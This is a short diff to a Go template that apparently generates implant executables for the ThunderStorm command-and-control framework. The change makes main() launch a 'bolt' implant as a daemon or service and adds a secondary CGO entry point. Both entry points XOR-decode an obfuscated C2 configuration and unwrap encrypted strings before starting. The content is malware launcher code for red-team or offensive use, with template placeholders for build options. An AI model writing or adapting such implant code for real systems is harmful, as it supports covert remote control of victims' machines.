@@ -21,9 +21,9 @@ import (
 
 	"github.com/iDigitalFlame/ThunderStorm/bolt"
 	"github.com/iDigitalFlame/xmt/c2/cfg"
+	"github.com/iDigitalFlame/xmt/data/crypto"
 	"github.com/iDigitalFlame/xmt/data/crypto/subtle"
 	"github.com/iDigitalFlame/xmt/man"
-	"github.com/iDigitalFlame/xmt/util"
 )
 
 var z = cfg.Config{
@@ -41,12 +41,26 @@ var k = [...]byte{
 }
 
 func main() {
+	// NOTE(dij): Only ran if non-CGO or CGO main is called.
+	if $checks {
+		return
+	}
+	subtle.XorOp(z, k[:])
+	// NOTE(dij): "os.Args" Will only work if non-CGO, GO-CGO cannot access argv.
+	bolt.Daemon(
+		$service, $ignore || len(os.Args) > 2, $load, $critical, man.LinkerFromName($event),
+		crypto.UnwrapString(k[:], g[:]), crypto.UnwrapString(k[:], p[:]), z,
+	)
+}
+
+func secondary() {
+	// NOTE(dij): Reserved for CGO secondary functions.
 	if $checks {
 		return
 	}
 	subtle.XorOp(z, k[:])
 	bolt.Start(
-		len(os.Args) >= 2, $load, $critical, man.LinkerFromName($event),
-		util.Decode(k[:], g[:]), util.Decode(k[:], p[:]), z,
+		$ignore || len(os.Args) > 2, $load, $critical, man.LinkerFromName($event),
+		crypto.UnwrapString(k[:], g[:]), crypto.UnwrapString(k[:], p[:]), z,
 	)
 }
